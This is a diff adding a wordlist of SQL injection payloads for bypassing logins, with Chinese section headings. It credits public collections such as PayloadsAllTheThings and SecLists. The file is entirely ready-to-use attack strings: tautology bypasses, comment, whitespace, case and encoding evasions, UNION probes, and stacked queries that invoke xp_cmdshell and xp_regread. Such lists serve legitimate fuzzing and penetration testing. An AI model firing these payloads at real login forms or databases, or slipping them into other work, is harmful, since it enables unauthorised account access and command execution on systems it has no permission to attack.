@@ -1,0 +1,198 @@
+# SQL Injection Authentication Bypass Payloads
+# 来源: PayloadsAllTheThings, FuzzDB, SecLists
+# 大神级登录绕过payload集合
+
+# === 基础绕过 ===
+' or '1'='1
+' or '1'='1'--
+' or '1'='1'#
+' or '1'='1'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1
+') or ('1'='1
+') or ('1'='1'--
+') or ('1'='1'#
+') or ('1'='1'/*
+" or "1"="1
+" or "1"="1"--
+" or "1"="1"#
+" or "1"="1"/*
+" or 1=1--
+" or 1=1#
+" or 1=1/*
+") or ("1"="1
+") or ("1"="1"--
+or 1=1
+or 1=1--
+or 1=1#
+or 1=1/*
+' or ''='
+" or ""="
+' or 'x'='x
+') or ('x'='x
+" or "x"="x
+") or ("x"="x
+'='
+'LIKE'
+'=0--+
+admin'--
+admin'#
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin' or '1'='1'/*
+admin') or ('1'='1
+admin') or ('1'='1'--
+admin') or ('1'='1'#
+admin') or '1'='1
+admin') or '1'='1'--
+admin') or '1'='1'#
+admin" or "1"="1
+admin" or "1"="1"--
+admin" or "1"="1"#
+admin") or ("1"="1
+admin") or ("1"="1"--
+admin") or ("1"="1"#
+
+# === 高级绕过 ===
+' OR '1
+' OR 1 -- -
+" OR "" = "
+" OR 1 = 1 -- -
+'='
+'LIKE'
+'=0--+
+' or 0=0 --
+' or 0=0 #
+" or 0=0 --
+" or 0=0 #
+or 0=0 --
+or 0=0 #
+' or 'a'='a
+' or 'a'='a'--
+') or ('a'='a
+" or "a"="a
+") or ("a"="a
+or a=a
+or a=a--
+' or 2 > 1
+' or 2 between 1 and 3
+' or 3=3
+' or 3=3 --
+' or '7659'='7659
+' or 'something' like 'some%'
+' or 'something' = 'some'+'thing'
+' or 'text' = n'text'
+' or 'text' > 't'
+' or 'unusual' = 'unusual'
+' or 'whatever' in ('whatever')
+' or uid like '%
+' or uname like '%
+' or userid like '%
+' or user like '%
+' or username like '%
+' or username like char(37);
+
+# === 注释绕过 ===
+'/**/or/**/1/**/=/**/1
+'/**/or/**/1/**/=/**/1--
+'/**/or/**/1/**/=/**/1#
+' /*!or*/ '1'='1'--
+'/*!50000or*/'1'='1'--
+' or/**/1=1--
+' or/**/1=1#
+
+# === 空格绕过 ===
+'%09or%091=1--
+'%0aor%0a1=1--
+'%0bor%0b1=1--
+'%0cor%0c1=1--
+'%0dor%0d1=1--
+'+or+1=1--
+'%20or%201=1--
+'%a0or%a01=1--
+
+# === 大小写混合 ===
+' oR '1'='1'--
+' Or '1'='1'--
+' OR '1'='1'--
+' oR 1=1--
+' Or 1=1--
+' OR 1=1--
+
+# === 双写绕过 ===
+' OORR '1'='1'--
+' ANANDD 1=1--
+' OORR 1=1--
+
+# === 编码绕过 ===
+%27%20or%20%271%27%3D%271
+%27%20or%20%271%27%3D%271%27--
+%27%20OR%20%271%27%3D%271
+%27%20OR%20%271%27%3D%271%27--
+%27%20or%201=1--
+%27%20OR%201=1--
+%2527%2520or%25201=1--
+
+# === 特殊字符 ===
+'-'
+'&'
+'^'
+'*'
+' or 1 --'
+' or 1/*
+; or '1'='1'
+' -- &password=
+password:*/=1--
+
+# === UNION 绕过 ===
+' UNION SELECT 1--
+' UNION SELECT 1,2--
+' UNION SELECT 1,2,3--
+' UNION ALL SELECT 1--
+' UNION ALL SELECT 1,2--
+' UNION ALL SELECT 1,2,3--
+' union select 1,2,3--
+' union all select 1,2,3--
+
+# === 堆叠查询 ===
+'; exec master..xp_cmdshell 'ping 127.0.0.1'--
+'; exec xp_regread
+'; execute immediate 'sel' || 'ect us' || 'er'
+'; exec ('sel' + 'ect us' + 'er')
+
+# === 特殊数据库 ===
+# MySQL
+admin'#
+admin'/*
+admin'-- -
+# MSSQL
+admin'--
+admin';--
+# Oracle
+admin'--
+admin' or 1=1--
+# PostgreSQL
+admin'--
+admin';--
+
+# === 万能密码 ===
+' or 1=1 limit 1 -- -+
+' or 1=1 limit 1 --
+' or 1=1 limit 1 #
+' or 1=1/*
+' or 1=1;--
+' or 1=1;#
+' or 1=1 or ''='
+' or 1=1 or ""="
+1' or '1'='1
+1' or '1'='1'--
+1' or '1'='1'#
+1' or '1'='1'/*
+1') or ('1'='1
+1') or ('1'='1'--
+1') or ('1'='1'#
+1') or ('1'='1'/*
